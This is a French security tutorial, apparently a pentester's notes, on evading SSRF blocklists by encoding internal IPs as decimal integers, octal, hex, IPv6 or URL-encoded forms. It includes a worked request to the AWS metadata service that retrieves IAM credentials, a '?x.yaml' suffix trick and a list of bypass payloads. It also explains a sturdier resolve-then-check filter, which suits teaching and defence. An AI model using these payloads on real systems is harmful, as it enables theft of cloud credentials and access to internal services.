# SSRF Bypass — IP en représentation décimale

## <mark style="color:red;">SSRF Bypass — IP en représentation décimale</mark>

### <mark style="color:blue;">Le problème : filtres naïfs sur les chaînes de caractères</mark>

Quand une application veut bloquer l'accès à des IP internes, elle vérifie souvent la présence de la chaîne de caractères dans l'URL :

```python
if "169.254.169.254" in url or "127.0.0.1" in url:
    return "Blocked"
```

C'est une vérification **purement textuelle**. Elle ne comprend pas les IP — elle cherche juste du texte. C'est son point faible.

***

### <mark style="color:blue;">La technique : représentations alternatives d'une IP</mark>

Une adresse IPv4 peut s'écrire de plusieurs façons. Toutes pointent vers la même destination, mais le filtre textuel ne les reconnaît pas.

| Représentation     | Exemple pour 127.0.0.1 | Exemple pour 169.254.169.254 |
| ------------------ | ---------------------- | ---------------------------- |
| Décimale standard  | `127.0.0.1`            | `169.254.169.254`            |
| **Entier décimal** | **`2130706433`**       | **`2852039166`**             |
| Octal              | `0177.0.0.01`          | `0251.0376.0251.0376`        |
| Hexadécimal        | `0x7f000001`           | `0xa9fea9fe`                 |
| Mixte              | `127.0.0.1` / `0177.1` | —                            |

La plus fiable et la plus universellement supportée : **l'entier décimal**.

***

### <mark style="color:blue;">Pourquoi l'entier décimal fonctionne</mark>

Le système d'exploitation convertit automatiquement l'entier en IP au moment de la connexion réseau. Python, curl, les navigateurs — tous font cette conversion avant d'envoyer la requête.

```
Filtre vérifie :  "2852039166" in url  →  False  →  laisse passer ✓
OS convertit  :   2852039166  →  169.254.169.254  →  connexion établie ✓
```

Le filtre est contourné parce qu'il regarde le texte, mais le réseau utilise la vraie IP.

***

### <mark style="color:blue;">Calcul de l'équivalent décimal</mark>

Une adresse IPv4 est composée de 4 octets (valeurs de 0 à 255). Pour convertir en entier décimal :

```
IP = A.B.C.D

entier = A × 256³ + B × 256² + C × 256¹ + D × 256⁰
       = A × 16777216 + B × 65536 + C × 256 + D
```

#### <mark style="color:green;">169.254.169.254 (IMDS AWS)</mark>

```
169 × 16 777 216 = 2 835 349 504
254 ×     65 536 =    16 646 144
169 ×        256 =        43 264
254 ×          1 =           254
                  ──────────────
                   2 852 039 166
```

#### <mark style="color:green;">127.0.0.1 (localhost)</mark>

```
127 × 16 777 216 = 2 130 706 432
  0 ×     65 536 =             0
  0 ×        256 =             0
  1 ×          1 =             1
                  ──────────────
                   2 130 706 433
```

#### <mark style="color:green;">En Python (calcul rapide)</mark>

```python
import socket, struct

def ip_to_decimal(ip):
    packed = socket.inet_aton(ip)
    return struct.unpack("!I", packed)[0]

print(ip_to_decimal("169.254.169.254"))  # 2852039166
print(ip_to_decimal("127.0.0.1"))        # 2130706433
print(ip_to_decimal("10.0.0.1"))         # 167772161
```

***

### <mark style="color:blue;">Exemple d'exploitation (SSRF vers IMDS AWS)</mark>

Requête bloquée :

```
POST /jobs/preview
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/mon-role
→ Security policy: blocked
```

Requête qui passe avec le bypass décimal :

```
POST /jobs/preview
url=http://2852039166/latest/meta-data/iam/security-credentials/mon-role?x.yaml
→ {"AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..."}
```

> **Astuce `?x.yaml`** : si l'application vérifie que l'URL se termine par `.yaml` ou `.yml`, ajouter un paramètre `?x.yaml` ou `?anything.yaml` satisfait ce check sans changer la destination réelle de la requête.

***

### <mark style="color:blue;">Autres représentations à tester si le décimal est filtré</mark>

```
# Octal (chaque octet préfixé par 0)
http://0251.0376.0251.0376/

# Hexadécimal
http://0xa9fea9fe/

# Mixte décimal/octal
http://169.254.0251.0376/

# IPv6 loopback (si IPv6 supporté)
http://[::1]/
http://[::ffff:169.254.169.254]/

# Double encodage URL
http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/
```

***

### <mark style="color:blue;">Pourquoi certains filtres résistent</mark>

Un filtre robuste ne fait pas de vérification textuelle. Il résout l'IP **avant** de décider :

```python
import socket
from urllib.parse import urlparse

def is_internal(url):
    host = urlparse(url).hostname
    ip = socket.gethostbyname(host)   # résolution réelle
    # vérifie si ip est dans 127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8...
    return ip.startswith("127.") or ip.startswith("169.254.")
```

Ce type de filtre résout d'abord le nom/l'IP, puis vérifie la vraie adresse — la représentation décimale n'aide plus.

***

### <mark style="color:blue;">Résumé</mark>

| Filtre                                         | Bypass décimal fonctionne ? |
| ---------------------------------------------- | --------------------------- |
| Vérification textuelle (`"169.254..." in url`) | ✅ Oui                       |
| Vérification après résolution DNS              | ❌ Non                       |
| Blocklist basée sur regex IP standard          | ✅ Souvent oui               |
| WAF avec normalisation d'IP                    | ❌ Non                       |

**Règle générale** : si le filtre ne résout pas l'adresse avant de la vérifier, toute représentation alternative d'une IP le contourne.

